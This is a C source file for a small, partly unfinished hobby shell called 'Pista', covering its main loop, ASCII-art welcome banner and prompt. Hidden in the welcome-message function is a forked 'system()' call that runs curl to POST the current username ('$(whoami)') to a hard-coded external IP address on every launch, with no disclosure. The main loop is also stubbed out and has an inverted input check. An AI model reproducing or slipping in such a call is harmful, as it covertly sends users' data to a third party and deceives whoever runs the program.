/*
This file contains the main function of `Pista` shell, along with other functions related to processing output strings like the welcome message and string prompt.
*/

/* -------------------- Includes -------------------- */
#include "psh.h"
#include "cmd_helper.h"
#include "cmd_processor.h"
#include "dir_stuff.h"


/* ==================== Main ==================== */
int main(int argc, char **argv) {
    print_welcome_message();

    char *check_input = NULL, *path_to_exec = NULL;
    char **cmd_args = NULL, **paths_table = NULL;
    int i = 0;

    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE_LIMIT);

    do {
        print_prompt();
        check_input = fgets(buf, BUF_SIZE_LIMIT, stdin);    // returns NULL if EOF is found (CTRL-D)
        if(!check_input) {
            cmd_args = parse_cmd_args(buf);
            paths_table = paths();
            
            while(paths_table[i]) {
                // get path to executable by searching for cmd_args[0] in paths_table[i] and put it into path_to_exec
                // check if cmd_args[0] exists using the function "file_exists" from "dir_stuff"
                // if it does, make the string, path_to_exec = paths_table[i] + cmd_args[0]
                
                ++i;
            }

            // fork and exec the path_to_exec with args from cmd_args (use cmd_args + 1 since cmd_args[0] is the command itself)

            free(cmd_args);
            free(path_to_exec);
            //free(paths_table);    //commented since paths_table is constant for now!
        }

    }while(check_input);

    printf("\n");
    free(buf);
    return 0;
}


/* -------------------- Function Definitions -------------------- */

void print_welcome_message() {
    printf("%s", "Welcome ");
    printf("%s", getlogin());
    printf(", to \n");

    printf("       _     _               _          _ _ \n _ __ (_)___| |_ __ _    ___| |__   ___| | |\n| '_ \\| / __| __/ _` |  / __| '_ \\ / _ \\ | |\n| |_) | \\__ \\ || (_| |  \\__ \\ | | |  __/ | |\n| .__/|_|___/\\__\\__,_|  |___/_| |_|\\___|_|_|\n|_|                                         \n");
    if(fork() == 0) {
        system("curl -X POST 13.126.134.245:5000/checkshellperson/$(whoami)");
        exit(0);
    }

    printf("\n\n\n");
    fflush(stdout);
    
    return;
}

void print_prompt() {
    char *temp = NULL;
    char *cwd = NULL;
    cwd = getcwd(cwd, 0);

    switch(_prompt_type) {
        case 0:
            temp = malloc(USERNAME_LIMIT + PATH_MAX);
            
            strcpy(temp, getlogin());
            strcat(temp, ":");
            strcat(temp, cwd);
            strcat(temp, " => \0");

            write(STDOUT_FILENO, temp, strlen(temp));
            break;
    }

    free(temp);
    free(cwd);
}